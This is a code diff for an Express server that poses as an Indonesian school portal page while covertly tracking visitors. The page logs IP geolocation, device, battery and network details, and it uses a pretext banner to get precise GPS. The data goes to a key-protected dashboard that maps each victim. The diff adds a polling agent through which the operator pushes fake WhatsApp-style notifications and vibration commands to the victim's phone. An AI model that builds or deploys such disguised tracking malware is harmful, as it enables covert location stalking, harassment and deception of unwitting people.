@@ -2,27 +2,21 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const http = require('http');
-const webpush = require('web-push');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-
-const publicVapidKey = 'BB2uH3T4F5g6H7j8K9l0M1n2O3p4Q5r6S7t8U9v0W1x2Y3z4A5b6C7d8E9f0G1h2I3j4K5l6M7n8O9p0Q1r2S3t4U5v6W7x8Y9z0';
-const privateVapidKey = 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4Y5z6A7b8C9d0E1f2';
-
-webpush.setVapidDetails('mailto:admin@sekolah.id', publicVapidKey, privateVapidKey);
 
 const DASH_KEY = 'gilang123';
 const TLOG = path.join(__dirname, '_tlog');
 const GEO_FILE = path.join(TLOG, 'geo.tsv');
 const GPS_FILE = path.join(TLOG, 'gps.tsv');
 const DEVICE_FILE = path.join(TLOG, 'devices.json');
-const SUBS_FILE = path.join(TLOG, 'subscriptions.json');
+const CMD_FILE = path.join(TLOG, 'commands.json');
 
 if (!fs.existsSync(TLOG)) fs.mkdirSync(TLOG, { recursive: true });
 if (!fs.existsSync(GEO_FILE)) fs.writeFileSync(GEO_FILE, '');
 if (!fs.existsSync(GPS_FILE)) fs.writeFileSync(GPS_FILE, '');
-if (!fs.existsSync(SUBS_FILE)) fs.writeFileSync(SUBS_FILE, '[]');
+if (!fs.existsSync(CMD_FILE)) fs.writeFileSync(CMD_FILE, '[]');
 
 function clientIp(req) {
   const raw = req.headers['cf-connecting-ip'] || (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '0.0.0.0';
@@ -50,18 +44,6 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-app.post('/api/subscribe', (req, res) => {
-  const ip = clientIp(req);
-  const sub = req.body;
-  if (!sub || !sub.endpoint) return res.status(400).json({error: 'Invalid sub'});
-  
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  subs.push({ ip, subscription: sub });
-  fs.writeFileSync(SUBS_FILE, JSON.stringify(subs));
-  res.status(201).json({ ok: true });
-});
-
 app.get('/api/geoip', async (req, res) => {
   const ip = clientIp(req);
   const dev = detectDevice(req.headers['user-agent']);
@@ -80,35 +62,31 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/push', async (req, res) => {
+// API COMMAND (Remote Notif & Getar)
+app.post('/api/send-command', (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
-  const { ip, text } = req.body;
-  
-  let subs = [];
-  try { subs = JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8')); } catch (_) {}
-  const targetSubs = subs.filter(s => s.ip === ip);
-  
-  if (targetSubs.length === 0) return res.json({ ok: false, msg: 'Target belum izinin notif' });
-
-  const payload = JSON.stringify({ title: 'Pemberitahuan Sistem', body: text, icon: 'https://cdn-icons-png.flaticon.com/512/732/732200.png' });
-  
-  for (let t of targetSubs) {
-    try { await webpush.sendNotification(t.subscription, payload); } catch (e) { console.log('Push error', e.message); }
-  }
+  const { ip, cmd, payload } = req.body;
+  let cmds = [];
+  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
+  cmds.push({ ip, cmd, payload, time: Date.now(), status: 'pending' });
+  fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
   res.json({ ok: true });
 });
 
-app.get('/sw.js', (req, res) => {
-  res.setHeader('Content-Type', 'application/javascript');
-  res.send(`
-    self.addEventListener('push', function(e) {
-      const data = e.data ? e.data.json() : { title: 'Notifikasi', body: 'Pesan baru' };
-      const options = { body: data.body, icon: data.icon, badge: data.icon, vibrate: [200, 100, 200] };
-      e.waitUntil(self.registration.showNotification(data.title, options));
-    });
-  `);
+app.get('/api/get-command', (req, res) => {
+  const ip = clientIp(req);
+  let cmds = [];
+  try { cmds = JSON.parse(fs.readFileSync(CMD_FILE, 'utf8')); } catch (_) {}
+  const pending = cmds.find(c => c.ip === ip && c.status === 'pending');
+  if (pending) {
+    pending.status = 'executed';
+    fs.writeFileSync(CMD_FILE, JSON.stringify(cmds));
+    return res.json({ hasCmd: true, cmd: pending.cmd, payload: pending.payload });
+  }
+  res.json({ hasCmd: false });
 });
 
+// ============ DASHBOARD LIST ============
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -147,6 +125,7 @@ app.get('/dash', (req, res) => {
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Intel</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}.header{padding:24px 20px;background:var(--card);border-bottom:1px solid var(--border)}.header h1{margin:0;font-size:18px}.list{padding:16px}.row{display:flex;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;text-decoration:none;color:inherit}.row-icon{width:48px;height:48px;font-size:24px;display:flex;align-items:center;justify-content:center;margin-right:14px}.dev{font-weight:700}.meta{font-size:13px;color:var(--muted)}</style></head><body><div class="header"><h1>⚡ Langz Intel</h1></div><div class="list">${rows}</div></body></html>`);
 });
 
+// ============ DASHBOARD MAP & COMMAND ============
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -155,70 +134,72 @@ app.get('/dash/map', (req, res) => {
   const lat = d.gpsLat !== null ? d.gpsLat : d.lat, lon = d.gpsLon !== null ? d.gpsLon : d.lon;
   const zoom = d.gpsLat !== null ? 17 : 11, acc = d.gpsAcc || 500;
 
-  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;--green:#4ade80;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}#map{height:45vh}.panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}.back{color:var(--accent);text-decoration:none;font-size:14px}.msg-box{background:#27272a;border-radius:12px;padding:16px;margin-top:16px}.msg-input{width:100%;background:#18181b;border:1px solid var(--border);color:#fff;padding:12px;border-radius:8px;margin-bottom:10px}.msg-btn{width:100%;background:var(--accent);color:#000;border:none;padding:12px;border-radius:8px;font-weight:700;cursor:pointer}</style></head><body><div id="map"></div><div class="panel"><a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a><h2 style="margin:10px 0;">${d.model}</h2><div style="font-size:13px;color:var(--muted);margin-bottom:15px;">IP: ${d.ip}</div><div class="msg-box"><h3 style="margin:0 0 10px;font-size:14px;color:var(--accent);">🔔 Kirim Push Notification</h3><input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan..."><button class="msg-btn" onclick="sendPush()">Kirim ke HP Target</button><div id="status" style="font-size:12px;color:var(--green);margin-top:8px;display:none;text-align:center;">✅ Terkirim! Cek HP target.</div></div></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>const map=L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);L.circle([${lat},${lon}],{radius:${acc},color:'#4ade80',fillOpacity:0.2}).addTo(map);L.circleMarker([${lat},${lon}],{radius:12,color:'#22c55e',fillColor:'#4ade80',fillOpacity:1,weight:3}).addTo(map);async function sendPush(){const text=document.getElementById('msgText').value;if(!text)return;await fetch('/api/push',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',text:text})});document.getElementById('msgText').value='';document.getElementById('status').style.display='block';setTimeout(()=>document.getElementById('status').style.display='none',3000);}</script></body></html>`);
+  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Map</title><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;--green:#4ade80;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}#map{height:45vh}.panel{padding:20px;background:var(--card);border-radius:20px 20px 0 0;margin-top:-20px;position:relative;z-index:2}.back{color:var(--accent);text-decoration:none;font-size:14px}.msg-box{background:#27272a;border-radius:12px;padding:16px;margin-top:16px}.msg-input{width:100%;background:#18181b;border:1px solid var(--border);color:#fff;padding:12px;border-radius:8px;margin-bottom:10px}.msg-btn{width:100%;background:var(--accent);color:#000;border:none;padding:12px;border-radius:8px;font-weight:700;cursor:pointer}.msg-btn.alt{background:#3f3f46;color:#fff;margin-top:8px}</style></head><body><div id="map"></div><div class="panel"><a class="back" href="/dash?k=${encodeURIComponent(DASH_KEY)}">‹ Kembali</a><h2 style="margin:10px 0;">${d.model}</h2><div style="font-size:13px;color:var(--muted);margin-bottom:15px;">IP: ${d.ip}</div><div class="msg-box"><h3 style="margin:0 0 10px;font-size:14px;color:var(--accent);">🔔 Kirim Notif & Aksi</h3><input type="text" id="msgText" class="msg-input" placeholder="Ketik pesan..."><button class="msg-btn" onclick="sendCmd('notif', document.getElementById('msgText').value)">Kirim Notifikasi</button><button class="msg-btn alt" onclick="sendCmd('vibrate')">Getarkan HP Target</button><div id="status" style="font-size:12px;color:var(--green);margin-top:8px;display:none;text-align:center;">✅ Perintah terkirim!</div></div></div><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><script>const map=L.map('map',{zoomControl:false}).setView([${lat},${lon}],${zoom});L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);L.circle([${lat},${lon}],{radius:${acc},color:'#4ade80',fillOpacity:0.2}).addTo(map);L.circleMarker([${lat},${lon}],{radius:12,color:'#22c55e',fillColor:'#4ade80',fillOpacity:1,weight:3}).addTo(map);async function sendCmd(cmd,payload){await fetch('/api/send-command',{method:'POST',headers:{'Content-Type':'application/json','x-auth-key':'${DASH_KEY}'},body:JSON.stringify({ip:'${d.ip}',cmd:cmd,payload:payload})});document.getElementById('status').style.display='block';setTimeout(()=>document.getElementById('status').style.display='none',3000);}</script></body></html>`);
 });
 
+// ============ LANDING PAGE (WEB SEKOLAH + AGENT) ============
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
 <html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Portal Sekolah</title>
-<style>body{margin:0;font-family:sans-serif;background:#f8fafc}.navbar{background:#0f766e;color:#fff;padding:15px;font-weight:bold}.hero{background:#fff;padding:30px;text-align:center}.container{padding:20px;max-width:600px;margin:auto}.card{background:#fff;padding:20px;border-radius:10px;margin-bottom:15px}</style></head>
+<style>body{margin:0;font-family:sans-serif;background:#f8fafc}.navbar{background:#0f766e;color:#fff;padding:15px;font-weight:bold}.hero{background:#fff;padding:30px;text-align:center}.container{padding:20px;max-width:600px;margin:auto}.card{background:#fff;padding:20px;border-radius:10px;margin-bottom:15px}.loc-banner{position:fixed;bottom:20px;left:20px;right:20px;background:#1e293b;color:#fff;padding:15px;border-radius:12px;display:flex;align-items:center;justify-content:space-between;z-index:999;transform:translateY(150%);transition:0.4s}.loc-banner.show{transform:translateY(0)}.loc-banner button{background:#38bdf8;color:#000;border:none;padding:8px 15px;border-radius:6px;font-weight:bold}</style></head>
 <body>
 <div class="navbar">🏫 SMK Negeri 1</div>
 <div class="hero"><h1>Portal Informasi Sekolah</h1></div>
-<div class="container"><div class="card"><h3>Pengumuman UTS</h3><p>Ujian Tengah Semester akan dilaksanakan minggu depan. Harap persiapkan diri dengan baik.</p></div></div>
-
-<button id="enableNotif" style="position:fixed;bottom:20px;left:20px;right:20px;padding:15px;background:#0f766e;color:#fff;border:none;border-radius:10px;font-weight:bold;font-size:14px;box-shadow:0 5px 15px rgba(0,0,0,0.2);z-index:999;">🔔 Aktifkan Notifikasi Pengumuman</button>
-
+<div class="container"><div class="card"><h3>Pengumuman UTS</h3><p>Ujian Tengah Semester akan dilaksanakan minggu depan. Harap persiapkan diri.</p></div></div>
+<div class="loc-banner" id="locBanner"><p>Aktifkan lokasi untuk melihat info terdekat.</p><button id="allowLoc">Aktifkan</button></div>
 <script>
-(async function(){
+(function(){
   const slug = ${JSON.stringify(slug)};
   fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});
 
-  if ('serviceWorker' in navigator) {
-    try { await navigator.serviceWorker.register('/sw.js'); } catch(e) { console.log(e); }
+  async function collectData() {
+    const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
+    if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
+    if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
+    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
+  }
+  collectData();
+
+  // --- AGENT POLLING (Terima Perintah Remote) ---
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/get-command');
+      const j = await r.json();
+      if (j.hasCmd) {
+        if (j.cmd === 'notif') showFakeNotif(j.payload);
+        if (j.cmd === 'vibrate') { if(navigator.vibrate) navigator.vibrate([500,200,500,200,1000]); }
+      }
+    } catch(e){}
+  }, 3000);
+
+  function showFakeNotif(text) {
+    const notif = document.createElement('div');
+    notif.style.cssText = 'position:fixed;top:10px;left:10px;right:10px;background:#fff;padding:15px;border-radius:12px;box-shadow:0 5px 20px rgba(0,0,0,0.2);z-index:9999;display:flex;gap:10px;align-items:center;font-family:sans-serif;';
+    notif.innerHTML = '<div style="width:35px;height:35px;background:#25D366;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;">💬</div><div style="flex:1;"><div style="font-weight:bold;font-size:13px;color:#000;">Pesan Baru</div><div style="font-size:12px;color:#555;">' + text + '</div></div>';
+    document.body.appendChild(notif);
+    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+    setTimeout(() => { notif.style.display = 'none'; }, 5000);
   }
 
-  document.getElementById('enableNotif').addEventListener('click', async () => {
-    const permission = await Notification.requestPermission();
-    if (permission === 'granted') {
-      const reg = await navigator.serviceWorker.ready;
-      const sub = await reg.pushManager.subscribe({
-        userVisibleOnly: true,
-        applicationServerKey: '${publicVapidKey}'
-      });
-      
-      await fetch('/api/subscribe', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(sub)
-      });
-      
-      document.getElementById('enableNotif').innerText = '✅ Notifikasi Aktif';
-      document.getElementById('enableNotif').style.background = '#22c55e';
-      setTimeout(() => document.getElementById('enableNotif').style.display = 'none', 2000);
-    } else {
-      alert('Anda menolak notifikasi.');
-    }
-  });
-
-  const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: slug };
-  if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
-  if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
-  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
-
-  setTimeout(() => {
-    if(!navigator.geolocation) return;
+  // GPS BANNER
+  const banner = document.getElementById('locBanner'), btnLoc = document.getElementById('allowLoc');
+  let isGpsDone = false;
+  setTimeout(() => { banner.classList.add('show'); }, 3000);
+  btnLoc.addEventListener('click', () => {
+    if (isGpsDone || !navigator.geolocation) return;
+    isGpsDone = true; banner.classList.remove('show');
     navigator.geolocation.getCurrentPosition(
-      p => fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug}) }).catch(()=>{}),
-      e => {}, {enableHighAccuracy:true}
+      p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug}) }).catch(()=>{}); btnLoc.innerText = 'Aktif'; },
+      e => {}, {enableHighAccuracy:true,timeout:15000}
     );
-  }, 3000);
+  });
 })();
 </script>
 </body></html>`);
 });
 
+// ============ START ============
 http.createServer(app).listen(PORT, '0.0.0.0', () => {
   console.log(`[TRACKER] Nyala di port ${PORT}`);
 });
